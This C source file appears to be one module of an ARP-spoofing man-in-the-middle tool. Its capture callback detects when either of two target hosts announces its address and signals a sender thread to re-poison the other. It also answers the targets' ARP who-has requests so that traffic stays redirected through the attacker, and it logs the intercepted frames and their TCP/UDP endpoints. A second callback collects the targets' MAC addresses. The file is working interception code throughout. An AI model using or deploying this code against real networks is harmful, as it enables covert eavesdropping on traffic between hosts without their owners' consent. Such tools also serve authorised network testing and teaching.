#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#include <receive.h>
#include <send.h>
#include <strat.h>
#include <filter.h>
#include <format.h>

extern unsigned int capture_count; // count of captured packets

int capture_callback(char* buff, struct capture_auxdata_t* aux, void* raw_args) {
  struct capture_arg_t* args = (struct capture_arg_t*)raw_args;
  struct ethernet_header* ether_p = (struct ethernet_header*)buff;
  struct arp_header* arp_p;

  if(aux->cap_len < sizeof(struct ethernet_header)) {
    fprintf(stderr, "Capture: got truncated ethernet header\n");
    return 0;
  }

  uint16_t ether_type = ntohs(ether_p->ether_type);

  // Identify source, should only be one of the 2 targets
  uint8_t ether_src = ethercmp(ether_p->ether_shost, args->ether_1) ? 1 : 2;
  write(args->pip, &ether_src, 1); // Warn sender thread that host is up

  if(ether_type == 0x806) { // ARP
    uint8_t cmd;
    arp_p = (struct arp_header*)(buff + sizeof(struct ethernet_header));

    if(aux->cap_len < (sizeof(struct ethernet_header) + sizeof(struct arp_header))) {
      fprintf(stderr, "Capture: got truncated arp header\n");
      return 0;
    }

    int broadcast = ethercmp(ether_p->ether_dhost, (uint8_t*)"\xff\xff\xff\xff\xff\xff");
    int source = (args->ip_1 == *((uint32_t*)(arp_p->ip_src))) ? 1 : (args->ip_2 == *((uint32_t*)(arp_p->ip_src))) ? 2 : 0;
    int target = (args->ip_1 == *((uint32_t*)(arp_p->ip_target))) ? 1 : (args->ip_2 == *((uint32_t*)(arp_p->ip_target))) ? 2 : 0;

    // React if a target announce its address, poison again the other target
    if(broadcast && source) {
      cmd = (SEND_CMD_SPF << 4) | ((source % 2) + 1);
      write(args->pip, &cmd, 1); // Tell send thread to re-spoof the address
    }

    // Respond to who-has from targets - don't respond to announcement
    if(arp_p->operation == 256 && target && !ethercmp(arp_p->MAC_src, arp_p->MAC_target) && (*((uint32_t*)arp_p->ip_src) != *((uint32_t*)arp_p->ip_target))) {

      // Warning for awareness
      if(broadcast) {
        printf("\033[31mWarning: %u.%u.%u.%u broadcast Who-has for %u.%u.%u.%u\033[0m\n",
          arp_p->ip_src[0], arp_p->ip_src[1], arp_p->ip_src[2], arp_p->ip_src[3],
          arp_p->ip_target[0], arp_p->ip_target[1], arp_p->ip_target[2], arp_p->ip_target[3]);
      }

      cmd = (SEND_CMD_RPL << 4) | ether_src;
      write(args->pip, &cmd, 1); // Tell send thread to reply to who-has
    }

    // check if we want to capture this
    struct packet_layers layout;
    memset(&layout, 0, sizeof(struct packet_layers));
    layout.ether_src = ether_p->ether_shost;
    layout.ether_dst = ether_p->ether_dhost;
    layout.ether_type = (uint8_t*)&(ether_p->ether_type);
    if(! applyRule(args->filter, &layout)) return 0;
  }

  // record frame
  if(add_capture(buff, aux->cap_len, aux->real_len, &(aux->time))) {
    fprintf(stderr, "Error while recording following frame in output file:\n");
  }

  capture_count += 1; // update capture count

  if(ether_type > 1536) { // packet to capture
    if(ether_type == 0x800) { // IP
      struct ip_header* ip_p = (struct ip_header*)(buff + sizeof(struct ethernet_header));
      switch(ip_p->protocol) {
        case 6:
        case 17:
        {
          uint16_t* psrc = (uint16_t*)(buff + sizeof(struct ethernet_header) + (ip_p->IHL * 4));
          uint16_t* pdst = (uint16_t*)(buff + sizeof(struct ethernet_header) + (ip_p->IHL * 4) + 2);
          printf("Packet from %u.%u.%u.%u[port:%u] to %u.%u.%u.%u[port:%u] %s\n",
            ip_p->source_address[0], ip_p->source_address[1], ip_p->source_address[2], ip_p->source_address[3], ntohs(*psrc),
            ip_p->destination_address[0], ip_p->destination_address[1], ip_p->destination_address[2], ip_p->destination_address[3], ntohs(*pdst),
            (ip_p->protocol == 6 ? "TCP" : "UDP"));
        }
        break;
        default:
          printf("Packet from %u.%u.%u.%u to %u.%u.%u.%u, protocol %u\n",
            ip_p->source_address[0], ip_p->source_address[1], ip_p->source_address[2], ip_p->source_address[3],
            ip_p->destination_address[0], ip_p->destination_address[1], ip_p->destination_address[2], ip_p->destination_address[3],
            ip_p->protocol);
      }
    } else if(ether_type == 0x806) { // ARP

      printf("%x:%x:%x:%x:%x:%x -> %x:%x:%x:%x:%x:%x",
      ether_p->ether_shost[0], ether_p->ether_shost[1], ether_p->ether_shost[2], ether_p->ether_shost[3], ether_p->ether_shost[4], ether_p->ether_shost[5],
      ether_p->ether_dhost[0], ether_p->ether_dhost[1], ether_p->ether_dhost[2], ether_p->ether_dhost[3], ether_p->ether_dhost[4], ether_p->ether_dhost[5]);

      if(arp_p->operation == 512) { // reply
        printf(" - ARP is-at %u.%u.%u.%u[%x:%x:%x:%x:%x:%x] to %u.%u.%u.%u\n",
        arp_p->ip_src[0], arp_p->ip_src[1], arp_p->ip_src[2], arp_p->ip_src[3],
        arp_p->MAC_src[0], arp_p->MAC_src[1], arp_p->MAC_src[2], arp_p->MAC_src[3], arp_p->MAC_src[4], arp_p->MAC_src[5],
        arp_p->ip_target[0], arp_p->ip_target[1], arp_p->ip_target[2], arp_p->ip_target[3]);
      } else { // request
        printf(" - ARP who-has %u.%u.%u.%u tell %u.%u.%u.%u[%x:%x:%x:%x:%x:%x]\n",
        arp_p->ip_target[0], arp_p->ip_target[1], arp_p->ip_target[2], arp_p->ip_target[3],
        arp_p->ip_src[0], arp_p->ip_src[1], arp_p->ip_src[2], arp_p->ip_src[3],
        arp_p->MAC_src[0], arp_p->MAC_src[1], arp_p->MAC_src[2], arp_p->MAC_src[3], arp_p->MAC_src[4], arp_p->MAC_src[5]);
      }
    } else {
      printf("Frame from %x:%x:%x:%x:%x:%x to %x:%x:%x:%x:%x:%x, ethertype: %x\n",
        ether_p->ether_shost[0], ether_p->ether_shost[1], ether_p->ether_shost[2], ether_p->ether_shost[3], ether_p->ether_shost[4], ether_p->ether_shost[5],
        ether_p->ether_dhost[0], ether_p->ether_dhost[1], ether_p->ether_dhost[2], ether_p->ether_dhost[3], ether_p->ether_dhost[4], ether_p->ether_dhost[5],
        ether_type);
    }
  } else fprintf(stderr, "Capture: Ethernet IEEE 802.3 capture not supported\n");

  return 0;
}


int identifier_callback(char* buff, struct capture_auxdata_t* aux, void* raw_args) {
  struct identifier_arg_t* args = (struct identifier_arg_t*)raw_args;

  static uint8_t state = 0;
  uint8_t ans;

  if(aux->cap_len < sizeof(struct ethernet_header) + sizeof(struct arp_header)) {
    fprintf(stderr, "Identifier: got truncated arp frame\n");
    return 0;
  }

  struct arp_header* arp_p = (struct arp_header*)(buff + sizeof(struct ethernet_header));

  if(args->ip_1 == *((uint32_t*)arp_p->ip_src)) {
    if(!(state & 1)) {
      memcpy(args->ret_ether_1, arp_p->MAC_src, 6);
      state |= 1;
      ans = 1;
      if(write(args->pip, &ans, 1) == -1) {
        perror("write ");
      }
    }
  } else if(args->ip_2 == *((uint32_t*)arp_p->ip_src)) {
    if(!(state & 2)) {
      memcpy(args->ret_ether_2, arp_p->MAC_src, 6);
      state |= 2;
      ans = 2;
      if(write(args->pip, &ans, 1) == -1) {
        perror("write ");
      }
    }
  }
  if(state == 3) return 1;
  return 0;
}

void* target_identifier(void* raw_args) {
  struct identifier_arg_t* args = (struct identifier_arg_t*) raw_args;
  uint8_t err = 4;

  if(apply_identifier_filter(args->ip_1, args->ip_2)) {
    write(args->pip, &err, 1);
    return NULL;
  }

  if(capture(identifier_callback, raw_args)) write(args->pip, &err, 1);

  return NULL;
}
